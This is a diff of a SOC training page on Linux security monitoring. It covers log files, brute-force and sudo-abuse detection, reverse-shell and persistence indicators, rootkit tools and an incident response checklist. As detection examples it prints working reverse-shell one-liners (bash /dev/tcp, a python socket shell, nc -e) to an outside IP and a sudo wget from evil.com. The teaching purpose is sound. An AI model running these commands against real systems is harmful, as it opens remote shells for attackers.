@@ -1,27 +1,111 @@
 <div class="p-4 rounded mb-4" style="background:rgba(17,24,39,0.9);border:1px solid #1f2937;">
 <h6 class="text-success mb-3"><i class="bi bi-book me-2"></i>Module 10: Linux Security Monitoring</h6>
 
-<h6 class="text-success mt-3">Sub-Domains / Rooms</h6>
-<ul style="color:#c0d0e0;">
-  <li><b>Linux Logging for SOC</b> — Understand syslog, auth.log, secure log, dmesg, and auditd for monitoring Linux systems.</li>
-  <li><b>Linux Threat Detection 1</b> — Detect SSH brute force, user enumeration, and unauthorized sudo usage from auth logs.</li>
-  <li><b>Linux Threat Detection 2</b> — Identify reverse shells, cron job abuse, and file integrity changes on Linux endpoints.</li>
-  <li><b>Linux Threat Detection 3</b> — Investigate kernel-level threats, rootkits, and persistence via systemd services and LD_PRELOAD.</li>
-</ul>
+<p style="color:#c0d0e0;">Linux powers most servers and cloud infrastructure. SOC analysts need to understand Linux logging, detect compromises, and investigate incidents on Linux systems.</p>
 
+<h6 class="text-success mt-3">Sub-Domains / Rooms</h6>
+
+<p style="color:#00d4ff;font-weight:600;">🔹 Linux Logging for SOC</p>
+<p style="color:#c0d0e0;">Linux logs are the primary source of forensic data on Linux servers. Understanding where to look and what to look for is critical.</p>
 <div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example Detection:</b><br>
-<code>/var/log/auth.log</code> shows 3000 failed SSH attempts from IP 45.33.32.156 in 5 minutes — brute force attack.<br>
-<code>/var/log/syslog</code> shows a cron job running every minute: <code>*/1 * * * * /tmp/.hidden/updater.sh</code> — persistence.<br>
-<code>audit.log</code> shows <code>auid=1000, uid=0, comm="bash"</code> — privilege escalation to root.<br>
-The analyst checks <code>.bash_history</code> and finds the attacker downloaded a reverse shell, escalated to root via CVE-2021-4034 (PwnKit), and installed a systemd service for persistence.
+<b>Critical Linux Log Files:</b><br><br>
+| Log File | Purpose | Key Things to Look For |
+|----------|---------|----------------------|
+| /var/log/auth.log | Authentication events | SSH logins, sudo usage, user additions |
+| /var/log/secure | RedHat auth events | Same as auth.log but for RHEL/CentOS |
+| /var/log/syslog | System events | Kernel messages, service starts/stops |
+| /var/log/messages | General system log | Hardware errors, systemd events |
+| /var/log/kern.log | Kernel messages | Module loading, driver issues |
+| /var/log/httpd/ | Apache web server logs | Web attacks, suspicious requests |
+| /var/log/nginx/ | Nginx web server logs | Same as Apache |
+| ~/.bash_history | User command history | All commands the user ran |
+| /var/log/cron | Cron job execution | Scheduled task activity |
+| audit.log | Linux Audit Daemon | System call auditing, file access |
 </div>
 
-<h6 class="text-success mt-3">Key Skills Learned</h6>
-<ul style="color:#c0d0e0;">
-  <li>Linux log file analysis (auth.log, syslog, audit.log)</li>
-  <li>SSH brute force detection</li>
-  <li>Reverse shell and persistence detection</li>
-  <li>Linux privilege escalation identification</li>
-</ul>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Useful Linux SOC Commands:</b><br>
+<code>last</code> — Show all recent logins (reads /var/log/wtmp)<br>
+<code>lastb</code> — Show failed login attempts (reads /var/log/btmp)<br>
+<code>who /var/log/wtmp</code> — Display wtmp in human-readable format<br>
+<code>ausearch -m LOGIN -i</code> — Query audit logs for login events<br>
+<code>grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn</code><br>
+→ Count failed SSH login attempts by source IP<br>
+<code>grep "Accepted" /var/log/auth.log | grep -v "127.0.0.1"</code><br>
+→ Show all successful remote logins
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">🔹 Linux Threat Detection 1: SSH Brute Force & Sudo Abuse</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>SSH Brute Force Detection:</b><br>
+<code>May 21 14:32:15 web-server sshd[12345]: Failed password for root from 45.33.32.156 port 54321 ssh2<br>
+May 21 14:32:16 web-server sshd[12346]: Failed password for root from 45.33.32.156 port 54322 ssh2<br>
+May 21 14:32:17 web-server sshd[12347]: Failed password for root from 45.33.32.156 port 54323 ssh2<br>
+... (500+ entries)<br>
+May 21 14:37:15 web-server sshd[12845]: Accepted password for root from 45.33.32.156 port 54821 ssh2</code><br>
+→ 500 failed attempts followed by success = brute force succeeded. Actions: check what the attacker did, rotate root password, disable root SSH login, deploy Fail2Ban.<br><br>
+<b>Sudo Abuse Detection:</b><br>
+<code>grep "sudo" /var/log/auth.log<br>
+May 21 14:38:00 web-server sudo: victim : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash<br>
+May 21 14:38:15 web-server sudo: victim : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/wget http://evil.com/tools.sh<br>
+May 21 14:38:30 web-server sudo: victim : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/chmod +x /tmp/tools.sh</code><br>
+→ User "victim" (compromised account) escalated to root and downloaded malicious tools. The auditd rule alerting on sudo use would catch this immediately.
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">🔹 Linux Threat Detection 2: Reverse Shells & Persistence</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Reverse Shell Detection:</b><br>
+Check for unusual network connections:<br>
+<code>ss -tulpn | grep ESTABLISHED<br>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State<br>
+tcp   ESTAB  0      0    10.0.1.50:443        45.33.32.156:4444      ESTABLISHED</code><br>
+→ A web server should accept connections (LISTEN), not establish outbound connections to suspicious IPs<br><br>
+<b>Common Reverse Shell Commands (detect in bash_history):</b><br>
+<code>bash -i >& /dev/tcp/45.33.32.156/4444 0>&1</code> — Classic bash reverse shell<br>
+<code>python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("45.33.32.156",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code><br>
+<code>nc -e /bin/sh 45.33.32.156 4444</code> — Netcat reverse shell<br><br>
+<b>Linux Persistence Detection:</b><br>
+1. <b>Cron jobs:</b> Check /var/spool/cron/crontabs/ and /etc/cron.d/ for unexpected entries<br>
+<code>*/5 * * * * /tmp/.hidden/update.sh</code> — Runs every 5 minutes from /tmp<br>
+2. <b>Systemd services:</b> Check /etc/systemd/system/ for new service files<br>
+<code>[Service]<br>ExecStart=/tmp/.hidden/malware<br>Restart=always</code><br>
+3. <b>SSH authorized_keys:</b> Check ~/.ssh/authorized_keys for unexpected public keys<br>
+4. <b>LD_PRELOAD:</b> Check /etc/ld.so.preload for suspicious library loading<br>
+5. <b>.bashrc/.profile:</b> Check for commands that execute on login
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">🔹 Linux Threat Detection 3: Rootkits & Kernel Threats</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Rootkit Detection:</b><br>
+Rootkits hide their presence by modifying system binaries or kernel modules.<br><br>
+<b>Symptoms:</b><br>
+- ls, ps, netstat show different results than expected<br>
+- System files have different sizes/checksums than known-good versions<br>
+- Kernel modules loaded that don't appear in any package database<br>
+- Hidden processes visible via /proc but not via ps command<br><br>
+<b>Detection Tools:</b><br>
+<code>chkrootkit</code> — Check for known rootkit signatures<br>
+<code>rkhunter</code> — Rootkit hunter — checks file hashes, hidden ports, suspicious binaries<br>
+<code>aide</code> — Advanced Intrusion Detection Environment — file integrity checking<br>
+<code>unhide</code> — Detect hidden processes by comparing /proc with ps output<br><br>
+<b>Example — Kernel Module Rootkit:</b><br>
+<code>lsmod | grep -i "hide\|rootkit\|sneaky"</code><br>
+<code>cat /proc/modules | grep -v "$(lsmod | cut -d' ' -f1)"</code><br>
+→ Look for kernel modules that don't appear in lsmod output<br><br>
+<b>Privilege Escalation (CVE-2021-4034 — PwnKit):</b><br>
+<code>pkexec --version</code> — Check vulnerable version<br>
+<code>journalctl -u pkexec --since "2021-01-01"</code><br>
+→ Check logs for pkexec exploitation attempts. The exploit triggers an out-of-bounds write that gives root shell.
+</div>
+
+<h6 class="text-success mt-3">Linux Incident Response Checklist</h6>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+1. <b>Isolate the host:</b> Disconnect from network to prevent further damage or exfiltration<br>
+2. <b>Collect volatile data:</b> Running processes (ps aux), network connections (ss -tulpn), logged-in users (who), uptime<br>
+3. <b>Collect persistent data:</b> auth.log, bash_history, cron jobs, systemd services, SSH keys<br>
+4. <b>Check for rootkits:</b> Run chkrootkit, rkhunter, check kernel modules<br>
+5. <b>Analyze timeline:</b> Use the logs to determine when the compromise occurred and what actions were taken<br>
+6. <b>Preserve evidence:</b> Use dd or LiME to capture memory, tar -czf for disk evidence<br>
+7. <b>Remediation:</b> Patch vulnerability, rotate credentials, remove persistence, reimage if needed
+</div>
 </div>
